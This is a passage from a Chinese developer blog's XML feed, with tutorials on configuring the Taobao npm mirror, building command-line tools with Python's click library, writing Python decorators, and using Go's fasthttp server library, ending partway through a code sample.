    <content type="text"><![CDATA[之前介绍过使用vscode搭建nodejs开发环境, 环境是搭建好了, 使用时有一个硬伤, 就是nodejs官方的源下载奇慢, 而一般js的项目依赖又多, 所以经常的结果就是: 慢得你啥都装不上(time out)。怎么解决喃？ 当然是换国内的源。我仅使用过淘宝的加速源，效果不错，一直用着，下面做简单的介绍。 简介淘宝NPM镜像官方是这样描述的: 这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。关于更多的信息请查看:淘宝NPM源官网 同步从registry.npm.taobao.org安装所有模块. 当安装的时候发现安装的模块还没有同步过来, 淘宝NPM会自动在后台进行同步, 并且会让你从官方 NPM registry.npmjs.org 进行安装. 下次你再安装这个模块的时候, 就会直接从 淘宝 NPM 安装了. 安装临时使用的话, 可以通过registry参数来指定淘宝源地址，比如1npm --registry=https://registry.npm.taobao.org xterm 当然也可以添加命令别名,这样就不用每次都添加–registry了12345678910alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \--cache=$HOME/.npm/.cache/cnpm \--disturl=https://npm.taobao.org/dist \--userconfig=$HOME/.cnpmrc&quot;# Or alias it in .bashrc or .zshrc$ echo &apos;\n#alias for cnpm\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \ --cache=$HOME/.npm/.cache/cnpm \ --disturl=https://npm.taobao.org/dist \ --userconfig=$HOME/.cnpmrc&quot;&apos; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc 其实淘宝的源很稳定，同步频率也快，因此一般直接替换系统的npm也可以1npm install -g cnpm --registry=https://registry.npm.taobao.org]]></content>
      <categories>
        <category>开发语言</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>源加速</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python命令行开发神器-click]]></title>
    <url>%2F2017%2F02%2F08%2Fpython-click%2F</url>
    <content type="text"><![CDATA[之前写过一篇博客介绍过如何写漂亮的命令行工具, 不过使用的是golang的cobra库, 整体而言效果和使用体验还是非常不错的, 不过今天看博客时发现了一个更不错的库，而且是Python的: Click,所以用起来应该更得心应手。 之前在开发openstack客户端时, 模仿openstack sdk写过CLI, 他也是对argparse库上做的封装, 但是使用起来也比较复杂, 简单看了下click的文档, 体验还是非常不错的。 简介先说下click的出生, 因为他出生名门: Pocoo, Pocoo是一个团队，Pocoo出品必是精品,比如 Flask, Werkzeug, Jinja 2 , Pygments, Sphinx。冲着pocoo的品牌, 都应该多看一眼click。click是一个用于快速构建命令行的python的第三方模块, 功能强大, 使用简单。我们都知道Python内置的Argparse模块，以前也经常用到, 当时觉得Argparse很不错, 因为没有对比(没有对比就没伤害), 看了下Click马上就觉得Argparse太繁琐了，Click相较于Argparse就好比requests对比urllib。我们看看click官方文档上是怎么说明click的： Click是一个使用最少代码构建漂亮CLI的命令行界面创建工具包, 高度可配置,但是却开箱即用他有3个特点： 支持命令的任意嵌套 支持命令行帮助页面的自动生成 支持子命令运行时惰性加载 快速使用构建CLI有2个要点: 命令和参数, 使用click时，@click.command()用户装饰命令, @click.option()和@click.argument()用于装饰参数, 比如下面就是一个经典的使用形式:12345678910111213import click@click.command()@click.option('--count', default=1, help='Number of greetings.')@click.option('--name', prompt='Your name', help='The person to greet.')def hello(count, name): """Simple program that greets NAME for a total of COUNT times.""" for x in range(count): click.echo('Hello %s!' % name)if __name__ == '__main__': hello() 为了演示他更强大的功能, 我们可以模拟一个docker的命令行。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@volume.command()def create(): """Create a volume""" pass@volume.command()def inspect(): """isplay detailed information on one or more volumes""" pass@volume.command()@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')@click.option('--format', type=str, help='Pretty-print volumes using a Go template')def ls(filter, quiet, format): """List volumes""" print("%s, %s, %s" % (filter, quiet, format))@volume.command()@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')@click.option('-l', '--link', type=str, help='Remove the specified link')@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')def rm(force, link, volume): """Remove one or more volumes""" print("%s, %s, %s" % (force, link, volume))@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" pass@network.command()def connect(): """Connect a container to a network""" pass@network.command()def ls(): """List networks""" pass@network.command()def rm(): """Remove one or more networks""" passif __name__ == '__main__': docker() 最终效果如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859➜ test python3 test.pyUsage: test.py [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: network Manage networks volume Manage volumes➜ test python3 test.py networkUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: connect Connect a container to a network create Create a network ls List networks rm Remove one or more networks➜ test python3 test.py volumeUsage: test.py volume [OPTIONS] COMMAND [ARGS]... Manage volumesOptions: --help Show this message and exit.Commands: create Create a volume inspect isplay detailed information on one or more... ls List volumes rm Remove one or more volumes➜ test python3 test.py volume ls --helpUsage: test.py volume ls [OPTIONS] List volumesOptions: -f, --filter TEXT Provide filter values (e.g. &apos;dangling=true&apos;) -q, --quiet Only display volume names --format TEXT Pretty-print volumes using a Go template --help Show this message and exit.➜ test python3 test.py volume rm --helpUsage: test.py volume rm [OPTIONS] Remove one or more volumesOptions: -f, --force TEXT Force the removal of a running container (uses SIGKILL) -l, --link TEXT Remove the specified link -v, --volume TEXT Remove the volumes associated with the container --help Show this message and exit. 命令与组这是click中最重要的概念, 我们可以通过command和group装饰器实现一个无限嵌套的命令行工具, 其中command用户装饰命令, group用于将命令分组(类)上面那个模块docker命令行就是分组的使用。123456789101112131415161718192021222324import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" passif __name__ == '__main__': docker() 命令行参数从命令行读取参数值，再将其传递给函数,读取的参数分为两类: 可选参数和必须参数，下面分别做介绍 可选参数使用@click.option装饰器完成可选参数的录入, 通过上面的栗子我们可以发现该装饰器有很多参数前面2个位置参数比如’-f’, ‘–force’用于描述参数名称, type指明参数等，option常用的设置参数如下： default: 设置命令行参数的默认值 help: 参数说明 type: 参数类型，可以是 string, int, float 等 prompt: 当在命令行中没有输入相应的参数时，会根据 prompt 提示用户输入 nargs: 指定命令行参数接收的值的个数我们可以依然这些选项来完成我们很长常用的功能 默认参数经常我们需要为参数设置一些默认值, 使用default指定参数的默认值就能办到, 就这么简单12345678910111213141516171819202122232425import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()@click.option('-n', '--name', type=str, default='flat', help='The network name')def create(name): """Create a network""" click.echo('create network %s success' % name)if __name__ == '__main__': docker() 运行结果:123456789101112➜ test python3 test.py network --helpUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: create Create a network➜ test python3 test.py network createcreate network flat success 选择参数很多情况下, 我们也会给用户一些选择参数, 比如性别就只能选择(M/F), 因此我们应该提示用户输入正确的值,在这种情况下，我们可以通过 click.Choice() 来限定1234567891011@user.command()@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")@click.help_option('-h', '--help')def create(gender): """Create a user""" if gender is None: raise click.BadOptionUsage("miss gender choice!") click.echo("user's gender is %s" % gender)if __name__ == '__main__': docker() 多值参数有时，一个参数需要接收多个值, 比如我们算一个立方体的体积, 这时候我们就需求通过nargs指定 该参数接收多少个值, 比如123456789@cube.command()@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")@click.help_option('-h', '--help')def volume(profile): """Compute cube's volume""" if profile is None: raise click.BadOptionUsage("miss profile!") v = profile[0] * profile[1] * profile[2] click.echo("the cube's volume is %s" % v) 密码参数命令行我们常常有输入密码的需求，这个我们应该怎么用喃？123456@user.command()@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)@click.help_option('-h', '--help')def create(password): """Create a user""" click.echo('Encrypting password to %s' % password) 这个看下效果:1234➜ test python3 test.py user createPassword:Repeat for confirmation:Encrypting password to 123 必选参数相较于可选参数的灵活性而言, 必须参数比较简单了。用@click.argument来添加固定参数。 定参这里需要主要位置参数的顺序了。比如3个定参数 x y z1234567@user.command()@click.argument('x')@click.argument('y')@click.argument('z')def create(x, y, z): """Create a user""" click.echo("%s, %s, %s" % (x, y, z)) 12345678910➜ test python3 test.py user create 1Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "y".➜ test python3 test.py user create 1 2Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "z".➜ test python3 test.py user create 1 2 31, 2, 3 不定参参数不定的情况也是常有的, 比如我们想将多个文件移到一个文件里面, src: file1 file2 file3 dir: file4。我们让nargs=-1就可以了, 他表示接收[:-1]的参数1234567@user.command()@click.argument('src', nargs=-1)@click.argument('dst', nargs=1)def create(src, dst): """Create a user""" click.echo("src: %s" % ' '.join(list(src))) click.echo("dst: %s" % dst) 123➜ test python3 test.py user create file1 file2 file3 file4src: file1 file2 file3dst: file4 其他功能click还有比较多的高级功能，比如分页和彩色打印, click文档写得比较好: click官方文档 总结pocoo非常热衷于使用装饰器, 可以说他们对装饰器的使用简直出神入化, 在flask里面就可见一斑, 而前一篇才讲了装饰器, 这个click库里面对装饰器的使用也称得上典范, 源码很值得一读。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>click</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python进阶系列-装饰器]]></title>
    <url>%2F2017%2F02%2F05%2Fpython-deractor%2F</url>
    <content type="text"><![CDATA[装饰器是一个非常重要的概念，可能算是进阶的一大门槛。装饰器允许向一个现有的对象添加新的功能，同时又不改变其结构,是一种功能增强的模式。在面向对象(OOP)的设计模式中，decorator被称为装饰模式。OOP的装饰模式需要通过继承和组合来实现，而Python除了能支持OOP的decorator外，直接从语法层次支持decorator。Python的decorator可以用函数实现，也可以用类实现。接下来将全面介绍关于Python装饰器相关的知识。 简介装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的函数或对象添加额外的功能。 引子在Python里，一切皆对象, 函数更是头等对象，函数对象可以被赋值给变量，所以，通过变量也能调用该函数12345678&gt;&gt;&gt; def now():... print('2017-02-02')...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2017-02-02&gt;&gt;&gt; f.__name__'now' 现在，假设我们要增强now()函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改now()函数的定义,该怎么做喃？最简单的方式就是动态替换now，并保持函数签名不变123456789101112131415def now(): print('2017-02-02')def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrappernow = debug(now)now() 为了方便python在语法层面就已经支持了装饰器(python &gt; 2.4),@语法糖实际上就等于now = debug(now), 因此实际上应该这样写1234567891011121314def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')now() 这个dubug装饰器有个巨大的缺陷: 我们只能装饰不带参数的函数。实际上函数的形式各种各样，如何才能一个装饰器适配各种函数喃？python提供的可变参数可以很好的解决这个问题。12345678910111213141516171819def debug(func): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')@debugdef hello(name): print("hello %s" % name)now()hello("Bob") 如此一个基础的装饰器就写完了，以下将介绍各式各样的装饰器。 函数式装饰器装饰器本身是一个函数 装饰函数被装饰的对象是一个函数, wrapper是对函数的增强 基础-装饰器无参数这是最基础的一种装饰器, 在引子中已经有栗子了。 高级-装饰器有参数带参数的装饰器和类装饰器属于进阶的内容。在理解这些装饰器之前，最好对函数的闭包和装饰器的接口约定有一定了解。关于python中的闭包概念我在下一篇中会单独介绍,这里你只需要知道闭包是一个携带状态的函数即可。实际上就是返回装饰器的一个函数，但是这个装饰器携带外部变量(这就是闭包)12345678910111213141516171819def debug(level='INFO'): def decorator(func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125;()".format(level, func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper return decorator@debug()def now(): print('2017-02-02')@debug("DEBUG")def hello(name): print("hello %s" % name)now()hello("Bob") 装饰类被装饰的对象是一个类,wrapper是对类的增强,所以装饰器的变化并不大,甚至可以沿用 基础-装饰器无参数123456789101112131415161718def debug(cls): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125; class".format(cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name_ return wrapper@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 高级-装饰器有参数1234567891011121314151617181920212223def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 类式装饰器装饰器函数其实是这样一个接口约束，它必须接受一个callable对象作为参数，然后返回一个callable对象。在Python中一般callable对象都是函数，但也有例外。只要某个对象重载了 call () 方法，那么这个对象就是callable的。我们可以让类的构造函数 init () 接受一个函数，然后重载 call () 并返回一个函数，也可以达到装饰器函数的效果。 装饰函数和类被装饰的对象是一个函数或是一个类，其实并没有本质上的差别，因此这里合并给出栗子 装饰器无参数1234567891011121314151617181920class debug(object): def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print("[DEBUG]: enter function &#123;func&#125;()".format(func=self.func.__name__)) return self.func(*args, **kwargs)@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 装饰器有参数1234567891011121314151617181920212223class debug(object): def __init__(self, level='INFO'): self._level = level def __call__(self, func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter function &#123;&#125;()".format(self._level ,func.__name__)) return func(*args, **kwargs) return wrapper@debug()class Hello(object): def __init__(self, name): self.name = name@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 内置装饰器内置的装饰器和普通的装饰器原理是一样的，只不过返回的不是函数，而是类对象，所以更难理解一些 propert我们先看看property到底是啥,以下是property类的doc string123456789101112131415161718192021222324252627282930313233class property(object): """ property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute fget is a function to be used for getting an attribute value, and likewise fset is a function for setting, and fdel a function for del'ing, an attribute. Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x x = property(getx, setx, delx, "I'm the 'x' property.") Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): "I am the 'x' property." return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x """ def __init__(self, fget=None, fset=None, fdel=None, doc=None): # known special case of property.__init__ pass ... 实际上property装饰器帮我们完成了x = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)这个动作，而且返回的是一个property对象。 staticmethodstaticmethod传入一个函数返回一个staticmethod的对象。123456789101112131415161718192021222324class staticmethod(object): """ staticmethod(function) -&gt; method Convert a function to be a static method. A static method does not receive an implicit first argument. To declare a static method, use this idiom: class C: def f(arg1, arg2, ...): ... f = staticmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. Static methods in Python are similar to those found in Java or C++. For a more advanced concept, see the classmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... classmethod同理classmethod传入一个函数返回一个classmethod对象。123456789101112131415161718192021222324252627class classmethod(object): """ classmethod(function) -&gt; method Convert a function to be a class method. A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom: class C: def f(cls, arg1, arg2, ...): ... f = classmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. If a class method is called for a derived class, the derived class object is passed as the implied first argument. Class methods are different than C++ or Java static methods. If you want those, see the staticmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... 需要注意的问题装饰器可以让你代码更加优雅，减少重复，但也不全是优点，也会带来一些问题。 位置错误1234567891011121314151617181920212223def html_tags(tag_name): print('begin outer function.') def wrapper(func): print("begin of inner wrapper function.") def wrapper(*args, **kwargs): content = func(*args, **kwargs) print("&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;".format(tag=tag_name, content=content)) print('end of inner wrapper function.') return wrapper print('end of outer function') return wrapper@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() 在装饰器中我在各个可能的位置都加上了 print 语句，用于记录被调用的情况。你知道他们最后打印出来的顺序吗？如果你心里没底，那么最好不要在装饰器函数之外添加逻辑功能，否则这个装饰器就不受你控制了1234567begin outer function.end of outer functionbegin of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function. 函数签名和文档使用装饰器后实际上函数的前面和文档都会被替换成wrapper的，虽然我们可以简单处理过来,但是这并不是完美的解决之道123456789101112131415161718192021222324252627282930import inspectdef debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob")print(Hello.__name__)print(hello.__name__)print(inspect.getsource(Hello))print(inspect.getsource(hello)) staticmethod和classmethod不能再次装饰当你想把装饰器用在一个静态方法或者类方法时，不好意思，报错了。12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug # 装饰实例方法，OK def run(self): print("&#123;&#125; is running!".format(self.model)) @debug # 装饰静态方法，Failed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) 前面已经解释了@staticmethod这个装饰器，其实它返回的并不是一个callable对象，而是一个staticmethod对象，那么它是不符合装饰器要求的（比如传入一个callable对象），你自然不能在它之上再加别的装饰器。要解决这个问题很简单，只要把你的装饰器放在@staticmethod之前就好了，因为你的装饰器返回的还是一个正常的函数，然后再加上一个@staticmethod是不会出问题的。12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug() # 装饰实例方法，OK def run(self): print("&#123;&#125; is running!".format(self.model)) @staticmethod @debug() # 静态装饰器放到最后就ok了 def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) 利用第三方库来写装饰器嵌套的装饰函数不太直观，我们可以使用第三方包类改进这样的情况，让装饰器函数可读性更好。 decoratordecorator.py是一个非常简单的装饰器加强包。你可以很直观的先定义包装函数wrapper() ，再使用decorate(func, wrapper)方法就可以完成一个装饰器。1234567891011121314151617181920@decoratordef debug(func, *args, **kwargs): print("[DEBUG] &#123;&#125;: enter &#123;&#125;()".format(datetime.now(), func.__name__)) return func(*args, **kwargs)@debugdef hello(name): """test""" print("hello %s" % name)@debugclass Hello(object): def __init__(self, name): self.name = namehello("Bob")print(inspect.getsource(hello))print(hello.__name__) decorator比较简陋, 要装饰类和带参数的装饰就不能很好支持了。 wraptwrapt是一个功能非常完善的包，用于实现各种你想到或者你没想到的装饰器。使用 wrapt 实现的装饰器你不需要担心之前 inspect 中遇到的所有问题，因为它都帮你处理了，甚至 inspect.getsource ( func ) 也准确无误更全面的文档可以参考wrapt官方文档123456789101112131415161718192021222324252627282930313233343536373839404142434445from datetime import datetimeimport wraptdef debug(level='INFO'): @wrapt.decorator def wrapper(wrapped, instance, args, kwargs): print("[&#123;&#125;]: &#123;&#125; message".format(level, datetime.now())) return wrapped(*args, **kwargs) return wrapperclass Class(object): @debug() def function_im(self, arg1, arg2): pass @debug("DEBUG") @classmethod def function_cm(cls, arg1, arg2): pass @debug("ERROR") @staticmethod def function_sm(arg1, arg2): pass@debug()class Hello(): def __init__(self, name): self.name = name@debug()def hello(name): print("hello %s" % name)c = Class()c.function_im(1, 2)Class.function_im(c, 1, 2)Class.function_cm(1, 2)Class.function_sm(1, 2)h = Hello("Bob")hello("Bob") 总结装饰器的理念是对原函数、对象的加强，相当于重新封装，所以一般装饰器函数都被命名为wrapper() ，意义在于包装。函数只有在被调用时才会发挥其作用。比如@debug 装饰器可以在函数执行时额外输出日志， @cache装饰过的函数可以缓存计算结果等等。最后避免重复造轮子推荐使用wrapt，除非wrapt真不能满足你的特性需求。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>deractor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高性能web之fasthttp]]></title>
    <url>%2F2017%2F01%2F25%2Ffasthttp%2F</url>
    <content type="text"><![CDATA[浏览网上博客时发现了这么一篇测试文章nginx vs iris, 结果是iris越胜一筹, 而Iris底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库fasthttp, 之前读过一点关于golang的net/http, 在处理用户的请求时的确有点粗暴, 直接一个连接一个goroutine, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把fasthttp, 来一起走进fasthttp的世界看看。 Benchmark的的胜出github上面有一个好事者写了一个Go Web框架性能的压测工具, 结果是fasthttp表现非常优异, 具体请查看go-web-framework-benchmark github地址请允许我贴一张他的图 简介fasthttp是Go的HTTP的第三方实现, 它宣称比标准库net/http快10倍, 是一款高性能的HTTP实现。Github中的Fasthttp best practices这段描述了它为啥高性能的原因 net/http 的实现是一个连接新建一个 goroutine; fasthttp是利用一个 worker 复用 goroutine，减轻 runtime 调度 goroutine 的压力 net/http 解析的请求数据很多放在 map[string]string (http.Header) 或 map[string][]string (http.Request.Form)，有不必要的 []byte 到 string 的转换，是可以规避的 net/http 解析 HTTP 请求每次生成新的 http.Request 和 http.ResponseWriter; fasthttp解析 HTTP 数据到 fasthttp.RequestCtx ，然后使用 sync.Pool复用结构实例，减少对象的数量 fasthttp会延迟解析 HTTP 请求中的数据，尤其是 Body 部分。这样节省了很多不直接操作 Body 的情况的消耗 但是因为fasthttp的实现与标准库差距较大，所以API的设计完全不同, 因此也不兼容标准库net/http。使用时既需要理解HTTP的处理过程，又需要注意和标准库的差别。 基本使用基本用法很简单, 1. 写好handler 2. 监听交给handler处理.12345678910111213141516171819package mainimport ( "fmt" "github.com/valyala/fasthttp")// 使用RequestCtx传递HTTP的数据func httpHandler(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "hello fasthttp")&#125;// 启动服务时指定处理任务的handlerfunc main() &#123; if err := fasthttp.ListenAndServe("0.0.0.0:8080", httpHandler); err != nil &#123; fmt.Println("start fasthttp fail:", err.Error()) &#125;&#125; 路由net/http提供http.ServeMux实现路由服务，但是匹配规则简陋，功能很简单，基本不会使用。 fasthttp吸取教训，默认没有提供路由支持。官方提到了4个路由实现: Iris, fasthttp-routing, fasthttproute, lu, 第一个是框架, 第二三个是单纯的路由, 第4个不知道。我这里选择fasthttprouter, 因为github上面这个项目文档和活跃度比较不错 安装fasthttprouter12345678➜ Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;github.com/buaazp/fasthttprouter (download)github.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)github.com/buaazp/fasthttprouter 简单使用详尽的使用还得去看Github或者源码, 请允许我贴一段官方的代码, 我本地也用着这个测12345678910111213141516171819202122232425package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Index(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "Welcome!\n")&#125;func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 请求和响应在fasthttp中使用一个对象来维护请求的上下文:RequestCtx, 它综合了http.Request和http.ResponseWriter的操作，可以更方便的读取和返回数据, 通过下图这种对照表我们可以清晰的看出来12345678910111213141516171819202122232425262728293031r.Body -&gt; ctx.PostBody()r.URL.Path -&gt; ctx.Path()r.URL -&gt; ctx.URI()r.Method -&gt; ctx.Method()r.Header -&gt; ctx.Request.Headerr.Header.Get() -&gt; ctx.Request.Header.Peek()r.Host -&gt; ctx.Host()r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()r.PostForm -&gt; ctx.PostArgs()r.FormValue() -&gt; ctx.FormValue()r.FormFile() -&gt; ctx.FormFile()r.MultipartForm -&gt; ctx.MultipartForm()r.RemoteAddr -&gt; ctx.RemoteAddr()r.RequestURI -&gt; ctx.RequestURI()r.TLS -&gt; ctx.IsTLS()r.Cookie() -&gt; ctx.Request.Header.Cookie()r.Referer() -&gt; ctx.Referer()r.UserAgent() -&gt; ctx.UserAgent()w.Header() -&gt; ctx.Response.Headerw.Header().Set() -&gt; ctx.Response.Header.Set()w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()w.WriteHeader() -&gt; ctx.SetStatusCode()w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()http.Error() -&gt; ctx.Error()http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FShttp.ServeFile() -&gt; fasthttp.ServeFile()http.Redirect() -&gt; ctx.Redirect()http.NotFound() -&gt; ctx.NotFound()http.StripPrefix() -&gt; fasthttp.PathRewriteFunc 下面是一个简单例子，在上下文中获取请求数据, 通过WriteString来返回响应。1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.WriteString("hello,fasthttp") // 因为实现不同，fasthttp 的返回内容不是即刻返回的 // 不同于标准库，添加返回内容后设置状态码，也是有效的 ctx.SetStatusCode(404) // 返回的内容也是可以获取的，不需要标准库的用法，需要自己扩展 http.ResponseWriter fmt.Printf("Host: %s\n", ctx.Host()) fmt.Printf("Body: %s\n", ctx.Response.Body()) fmt.Printf("Path: %s\n", ctx.Path()) fmt.Printf("Method: %s\n", ctx.Method()) fmt.Printf("URI: %s\n", ctx.URI()) fmt.Printf("Connect Time: %s\n", ctx.ConnTime()) fmt.Printf("UserAgent: %s\n", ctx.UserAgent())&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; Body处理fasthttp 提供比标准库丰富的 Body 操作 API，而且支持解析 Gzip 过的数据, 我们可以简单的使用上下文的PostBody方法获取body1234567891011121314151617181920212223242526272829303132package mainimport ( "encoding/json" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; body := ctx.PostBody() // 获取到的是 []byte fmt.Fprintf(ctx, "Body:%s", body) // 因为是 []byte，解析 JSON 很简单 var v interface&#123;&#125; json.Unmarshal(body, &amp;v) fmt.Printf("%v", v)&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 简单的测试结果12➜ Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125; 表单处理RequestCtx有同标准库的 FormValue() 方法，还对 GET 和 POST/PUT 传递的参数进行了区分1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx 